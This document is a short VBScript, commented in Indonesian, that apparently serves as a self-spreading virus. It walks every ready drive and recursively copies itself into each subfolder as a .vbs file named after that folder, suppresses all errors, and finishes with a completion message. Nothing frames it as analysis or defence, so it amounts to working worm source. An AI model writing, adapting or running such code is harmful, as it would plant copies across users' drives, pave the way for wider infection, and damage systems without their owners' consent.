Dim FSO
Dim Drive, Drives, Folder, SubFolder, SubFolders
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Drives = FSO.Drives
For Each Drive in Drives
If Drive.IsReady Then
ScanFolder Drive & "\"
End If
Next
ScanFolder "C:\"
'Beri Konfirmasi Proses Selesai...
MsgBox "Proses Selesai..."
Function ScanFolder(Path)
Dim strNamaFolder
On Error Resume Next
Set Folder = FSO.GetFolder(Path)
Set SubFolders = Folder.SubFolders
For Each SubFolder in SubFolders
strNamaFolder = SubFolder
CopyVirus strNamaFolder
ScanFolder SubFolder.Path
Next
End Function
Function CopyVirus(TargetPath)
Dim strPath
On Error Resume Next
strPath = TargetPath
If Right(strPath, 1) <> "\" Then
strPath = strPath & "\"
End If
If Not FSO.FileExists(strPath & NamaFolder(TargetPath) & ".vbs") Then
FSO.CopyFile WScript.ScriptFullName, strPath & NamaFolder(TargetPath) & ".vbs", TRUE
End If
End Function
Function NamaFolder(TargetFolder)
Dim i
On Error Resume Next
'Hilangkan Tanda BackSlash (\) Pada Nama Folder
If Right(TargetFolder, 1) = "\" Then
TargetFolder = Left(TargetFolder, Len(TargetFolder) - 1)
End If
'Jangan Proses Jika Merupakan Root Drive
If Len(TargetFolder) <= 3 Then
NamaFolder = ""
Exit Function
End If
'Jangan Proses Jika Tidak Memiliki Tanda BackSlash
If InStr(TargetFolder, "\") = 0 Then
NamaFolder = ""
Exit Function
End If
'Dapatkan Nama Folder
For i = 0 to Len(TargetFolder)
If Mid(TargetFolder, Len(TargetFolder) - i, 1) = "\" Then
Exit For
End If
Next
NamaFolder = Right(TargetFolder, i)
End Function